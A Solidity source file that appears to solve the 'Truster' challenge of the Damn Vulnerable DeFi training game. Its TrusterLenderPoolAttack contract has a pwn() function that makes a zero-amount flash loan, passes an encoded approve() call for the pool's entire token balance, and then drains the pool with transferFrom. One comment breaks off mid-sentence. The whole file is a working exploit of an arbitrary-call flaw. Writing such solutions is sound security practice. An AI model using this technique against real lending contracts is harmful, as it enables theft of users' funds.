// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/truster/TrusterLenderPool.sol";

contract TrusterLenderPoolAttack{
    IERC20 public immutable damnValuableToken;
    address public myAddress;
    address public lenderPoolAddress;

    constructor(address _tokenAddress, address _myAddress, address _lenderPoolAddress){
        damnValuableToken = IERC20(_tokenAddress);
        myAddress = _myAddress;
        lenderPoolAddress = _lenderPoolAddress;
    }

    function pwn() public {
        //Make a 0-amount flashloan, 
        //As target, specify the erc20-contract and in the call approve a withdrawal of entire balance to my address
        //After flashloan, I can 
        uint256 poolBalance = damnValuableToken.balanceOf(lenderPoolAddress);
        bytes memory encodedCall = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
        TrusterLenderPool(lenderPoolAddress).flashLoan(0, myAddress, address(damnValuableToken), encodedCall);
        damnValuableToken.transferFrom(lenderPoolAddress, myAddress, damnValuableToken.balanceOf(lenderPoolAddress));
    }
}